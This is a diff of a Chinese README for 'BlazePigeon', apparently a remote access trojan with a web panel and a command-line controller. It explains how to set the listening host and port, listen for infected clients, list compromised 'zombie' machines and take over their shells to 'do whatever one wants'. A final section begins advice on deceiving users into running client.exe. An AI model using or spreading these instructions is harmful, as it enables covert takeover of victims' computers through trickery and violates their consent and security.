@@ -16,26 +16,37 @@ pip install pywin32api
 pip install requests
 ```
 
-## 使用說明
-- 进入BlazePigeon文件夹，启动web服务
+## 使用说明
+有两种模式可以进行使用，web模式和命令行模式
 
+### web模式
+- 进入BlazePigeon文件夹，启动web服务
 ```shell
 python manage.py runserver 80 
 ```
+- 访问： http://127.0.0.1:80
+- 先要在客户端设置中设置客户端的ip信息
+- 检测服务是否在线/截图【Bug: 由于每个socket上只能在一个线程中工作，为防止出错，请在截图前检测是否在线以重新建立连接】
 
-- 打开http://127.0.0.1/client_setting/ ，设置客户端连接地址端口版本号
-- 打开server.py  python server.py，进入之后设置ip 和 port
+### 命令行模式
+- 运行`server.py`
+```shell
+python server.py
+```
 
+- 设置ip和port
 ```shell
 set lhost xxxx
 
 set lport xxxx 
 ```
 
-- 使用`exploit`命令: 进行监听客户端
-- 使用`sessions`命令: 进行查看当前在线肉鸡数 
-- 使用`shell <id>`命令: 控制肉鸡shell, 之后使用`shell`进行shell
-- 使用`exi`t命令: 推出程序
+- 可用命令【建议按照顺序执行】
+- `exploit`: 进行监听客户端
+- `sessions`: 进行查看当前在线肉鸡数 
+- `shell <id>`: 控制客户端为id的shell, 之后使用`shell`进入客户端的shell
+- 使用正确的shell命令【cmd命令集 | linux shell命令集】进行“为所欲为”
+- `exit`: 推出程序
 
 ## 欺骗客户
 - 在有了以上的监控平台，下一步就是怎么“欺骗”用户可以在机器上运行`client.exe`，以此来建立监控的链接。
